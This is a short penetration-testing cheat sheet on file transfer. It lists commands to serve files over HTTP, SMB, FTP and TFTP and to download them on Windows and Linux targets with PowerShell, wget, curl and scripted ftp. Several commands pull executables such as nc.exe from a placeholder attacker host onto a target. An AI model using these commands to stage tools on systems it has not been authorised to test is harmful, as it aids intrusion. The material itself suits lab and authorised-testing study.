# File Transfers

## HTTP
```
python -m SimpleHTTPServer 80
```

-> Windows
```
powershell -c "(new-object System.Net.WebClient).DownloadFile('http://<IP>/file.exe','C:\Users\user\Desktop\file.exe')"
iwr -uri http://<IP>/file -Outfile file
wget http://<IP>/file -O file
curl http://<IP>/file -o file
```

-> Linux
```
curl http://<IP>/file
wget http://<IP>/file
curl  http://<IP>/file > file
```

## SMB Server
-> Setting
```
impacket-smbserver share . -smb2support -user user -password teste321
```
-> Transfer
```
net use \\<smbserver>\share /USER:user teste321
copy \\<smbserver>\share\nc.exe .
```

## Pure-FTPd
-> Install and Configure
```
sudo apt update && sudo apt install pure-ftpd
sudo groupadd ftpgroup
sudo useradd -g ftpgroup -d /dev/null -s /etc ftpuser
sudo pure-pw useradd offsec -u ftpuser -d /ftphome
sudo pure-pw mkdb
cd /etc/pure-ftpd/auth/
sudo ln -s ../conf/PureDB 60pdb
sudo mkdir -p /ftphome
sudo chown -R ftpuser:ftpgroup /ftphome/
sudo systemctl restart pure-ftpd
```

-> transferring
```
echo open 192.168.0.20 21> ftp.txt
echo USER user>> ftp.txt
echo password>> ftp.txt
echo bin >> ftp.txt
echo GET nc.exe >> ftp.txt
echo bye >> ftp.txt
```
```
ftp -v -n -s:ftp.txt
```

## tftp
-> Install and Configure
```
sudo apt update && sudo apt install atftp
sudo mkdir /tftp
sudo chown nobody: /tftp
sudo atftpd --daemon --port 69 /tftp
```

-> transferring
```
tftp -i <IP> get file
```
